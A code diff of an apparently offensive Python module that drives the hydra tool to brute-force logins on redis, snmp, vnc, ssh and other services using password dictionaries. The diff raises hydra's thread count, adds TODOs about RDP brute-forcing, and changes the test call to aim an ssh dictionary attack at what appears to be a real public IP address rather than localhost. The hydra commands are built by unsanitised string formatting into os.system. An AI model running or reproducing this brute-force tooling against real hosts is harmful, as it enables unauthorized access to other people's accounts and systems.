@@ -103,15 +103,17 @@ def NameDictBrute(taskID, large_or_small, host, port, service):
     dict_name = 'dic_username_' + service + '.txt'
     username_dict = realjoin(USERNAME_DICT,dict_name)
     if service in ['redis','cisio','snmp','vnc']:
-        _ = os.system("hydra -P {} {} -s  {} {} -I -o {} -f".format(HYDRADIC_LARGE if large_or_small == "large" else HYDRADIC_SMALL,
+        _ = os.system("hydra -P {} {} -s  {} {} -I -o {} -f -t 15".format(HYDRADIC_LARGE if large_or_small == "large" else HYDRADIC_SMALL,
                                                                           host, port, service, file_name))
     else:
-        _ = os.system("hydra -L {} -P {} {} -s  {} {} -I -o {} -f".format(username_dict,
+        _ = os.system("hydra -L {} -P {} {} -s  {} {} -I -o {} -f -t 15".format(username_dict,
                                                                   HYDRADIC_LARGE if large_or_small == "large" else HYDRADIC_SMALL,
                                                                   host, port, service, file_name))
 
     print(_)
     ## TODO redis未授权访问无法解决
+    ## 有些情况下不生成文件,所以这里要进行异常处理
+    ## TODO RDP爆破 看看有没有替代方法
     with open(file_name, 'r') as f:
         print("-------------------------------------------------"+f.read())
         for _ in f:
@@ -127,8 +129,8 @@ def NameDictBrute(taskID, large_or_small, host, port, service):
 if __name__ == '__main__':
     # SSHBrute('sa','small','127.0.0.1','1433','mssql')
 
-    dispatch('5d7e39cd13e0dfe95c52e4cf','dict','small','127.0.0.1','6379','redis')
-    dispatch('5d7e39cd13e0dfe95c52e4cf','dict','small','127.0.0.1','22','ssh')
+    # dispatch('5d7e39cd13e0dfe95c52e4cf','dict','small','127.0.0.1','6379','redis')
+    dispatch('5d9af9c0774c122660fb837e','dict','small','149.129.89.190','22','ssh')
     # handle_result('5d51652fa814d0464ed543b7',"[22][ssh] host: 127.0.0.1   login: x   password: xuchao")
     # handle_result('5d51652fa814d0464ed543b7',"[22][aaa] host: 127.0.0.1   login: x   password: xuchao")
 
